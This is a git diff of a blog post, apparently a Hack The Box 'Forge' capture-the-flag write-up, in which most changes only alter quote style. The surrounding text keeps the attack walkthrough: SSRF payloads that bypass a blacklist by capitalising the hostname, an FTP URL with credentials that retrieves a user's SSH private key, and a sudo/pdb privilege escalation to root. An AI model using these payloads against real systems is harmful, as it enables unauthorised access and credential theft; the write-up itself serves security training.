@@ -6,8 +6,8 @@ date: 2021-09-12
 image: hackthebox-forge-writeup.webp
 ---
 
-import FixTheImageURL from '../../components/mdxComponents/FixTheImageURL.astro';
-import { components as MDXComponents } from '../../components/mdxComponents';
+import FixTheImageURL from "../../components/mdxComponents/FixTheImageURL.astro";
+import { components as MDXComponents } from "../../components/mdxComponents";
 export const components = MDXComponents;
 
 ## Nmap
@@ -41,7 +41,7 @@ There are three ports open `21:ftp(filtered),22:ssh,80:http`
 
 When we go to the `ip` it will redirected to `forge.htb`
 
-<FixTheImageURL src='web.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web.png" slug="hackthebox-forge-writeup" />
 
 Let's quickly add that in our `/etc/hosts` file.
 
@@ -64,14 +64,14 @@ Now let's check what's `running` on the port `80`.
 
 It's a `simple` gallery page.
 
-<FixTheImageURL src='web1.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web1.png" slug="hackthebox-forge-writeup" />
 
 And when we go to `upload` an image page we can see that there is `two` options to `upload` file
 
 1. upload through `local` file
 2. upload through `url`
 
-<FixTheImageURL src='web2.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web2.png" slug="hackthebox-forge-writeup" />
 
 After some `hit` and try to upload php `rev` shell through changing `shell.php` to `shell.php.jpg` but that's didn't `work`.
 
@@ -117,29 +117,29 @@ Now let's go to `admin.forge.htb`
 
 And we see only `localhost` is allowed.
 
-<FixTheImageURL src='web3.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web3.png" slug="hackthebox-forge-writeup" />
 
 After that i think we can `access` that admin page with upload from `url` functionality which we see in the `forge.htb/upload` page.
 
 For that let's `first` capture that req in `burp`.
 
-<FixTheImageURL src='web4.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web4.png" slug="hackthebox-forge-writeup" />
 
 And we can only use `http,https`.
 
-<FixTheImageURL src='burp.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp.png" slug="hackthebox-forge-writeup" />
 
 So let's `first` try with `loopback` address.
 
 And we see it's a `blacklisted` address.
 
-<FixTheImageURL src='burp1.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp1.png" slug="hackthebox-forge-writeup" />
 
 After that let's `check` if we can access the `admin.forge.htb`
 
 And we see it's also a `blacklisted` address.
 
-<FixTheImageURL src='burp2.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp2.png" slug="hackthebox-forge-writeup" />
 
 Let's `capitalize` all letters of the `sub-domain` to check if it's `bypass` the filter.
 
@@ -151,17 +151,17 @@ And we see we `successfully` bypass the filter and get the `link`.
 
 let's open that `link` and see what's inside that `admin` page.
 
-<FixTheImageURL src='burp3.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp3.png" slug="hackthebox-forge-writeup" />
 
 And we can see `firefox` can't open that so let's try with `curl`.
 
-<FixTheImageURL src='web5.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="web5.png" slug="hackthebox-forge-writeup" />
 
 And we get the `html` souce code of the `admin` page.
 
 And there is an `/announcements` page let's take a `look` on that.
 
-<FixTheImageURL src='cmd.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd.png" slug="hackthebox-forge-writeup" />
 
 ```js
 ┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
@@ -193,7 +193,7 @@ Now let's add `/announcements` in the req.
 url=http://ADMIN.FORGE.HTB/announcements&remote=1
 ```
 
-<FixTheImageURL src='burp4.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp4.png" slug="hackthebox-forge-writeup" />
 
 Now let's `check` what's inside that page with `curl`.
 
@@ -205,7 +205,7 @@ But the `notes` said they support `ftp,ftps,http,https` for uploading the fi
 
 So we can use this `functionality` to login inside `ftp` server.
 
-<FixTheImageURL src='cmd1.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd1.png" slug="hackthebox-forge-writeup" />
 
 ```js
 ┌───[us-free-1]─[10.10.14.61]─[root@parrot]─[~/Desktop/HTB/Forge]
@@ -243,11 +243,11 @@ url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1&re
 
 Got the `url`.
 
-<FixTheImageURL src='burp5.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp5.png" slug="hackthebox-forge-writeup" />
 
 It's `seems` like we are inside the `home` directory of user it's mean `.ssh` folder is also there let's `quickly` check it out.
 
-<FixTheImageURL src='cmd2.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd2.png" slug="hackthebox-forge-writeup" />
 
 Let's try to get the `id_rsa` of the user.
 
@@ -255,11 +255,11 @@ Let's try to get the `id_rsa` of the user.
 url=http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@127.1.1.1/.ssh/id_rsa&remote=1
 ```
 
-<FixTheImageURL src='burp6.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="burp6.png" slug="hackthebox-forge-writeup" />
 
 Got the `id_rsa` of the user.
 
-<FixTheImageURL src='cmd3.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd3.png" slug="hackthebox-forge-writeup" />
 
 ## id_rsa
 
@@ -306,7 +306,7 @@ shlLupso7WoS0AAAAKdXNlckBmb3JnZQE=
 
 Let's `ssh` in real quick and get the `user.txt`.
 
-<FixTheImageURL src='cmd4.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd4.png" slug="hackthebox-forge-writeup" />
 
 ## Privilege escalation
 
@@ -381,7 +381,7 @@ user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
 
 For create an `error` i use `'\` in my netcat you use `anything` you want.
 
-<FixTheImageURL src='cmd5.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd5.png" slug="hackthebox-forge-writeup" />
 
 Now we are `inside` the pdb let's `import` the os module and use our old `trick` for geeting `root`.
 
@@ -406,7 +406,7 @@ bash-5.0# cat root.txt
 6bbb84f76b9de4d37e8a7ed270691877
 ```
 
-<FixTheImageURL src='cmd6.png' slug='hackthebox-forge-writeup' />
+<FixTheImageURL src="cmd6.png" slug="hackthebox-forge-writeup" />
 
 Here is the `id_rsa` of root for those who only `wants` points.
 
